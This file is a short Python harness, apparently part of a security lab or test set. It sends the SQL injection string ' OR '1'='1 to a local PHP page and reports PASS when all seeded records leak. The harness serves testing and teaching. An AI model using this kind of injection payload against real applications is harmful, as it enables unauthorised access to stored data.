import http.client
import re
import sys
from urllib.parse import quote

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"
TIMEOUT = 5

NORMAL_NAME = "Alice"
TEST_NAME = "' OR '1'='1"


def fetch(name):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
    try:
        target = PATH + "?name=" + quote(name, safe="")
        conn.request(
            "GET",
            target,
            headers={
                "Host": f"{HOST}:{PORT}",
                "Connection": "close",
            },
        )
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    finally:
        conn.close()


def parse_records(body):
    return re.findall(r"<p>ID\s*(\d+)\s*：\s*([^<]*)</p>", body)


def main():
    status_normal, body_normal = fetch(NORMAL_NAME)
    status_test, body_test = fetch(TEST_NAME)

    normal_records = parse_records(body_normal)
    test_records = parse_records(body_test)

    print("普通 HTTP 状态:", status_normal)
    print("普通请求解析记录:", normal_records)
    print("测试 HTTP 状态:", status_test)
    print("测试请求解析记录:", test_records)

    ok_normal = status_normal == 200 and normal_records == [("1", "Alice")]
    expected = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
    ok_test = (
        status_test == 200
        and expected.issubset(set(test_records))
        and test_records != normal_records
    )

    if ok_normal and ok_test:
        print("PASS: 普通输入仅返回 Alice；测试输入返回预置三行，实际业务记录差异符合 SQL 注入路径。")
        return 0

    print("FAIL/无法判断：请检查服务、路径、common/db_connect.php、$db、lab_people 预置数据和查询失败提示。")
    if "查询失败" in body_normal or "查询失败" in body_test:
        print("页面出现查询失败提示，需检查数据库连接和 SQL 执行环境。")
    if not ok_normal:
        print("普通对照未满足，预期记录为 [('1','Alice')]。")
    if not ok_test:
        print("测试未满足：预期至少包含 ('1','Alice')、('2','Bob')、('3','Carol') 且不同于普通记录。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
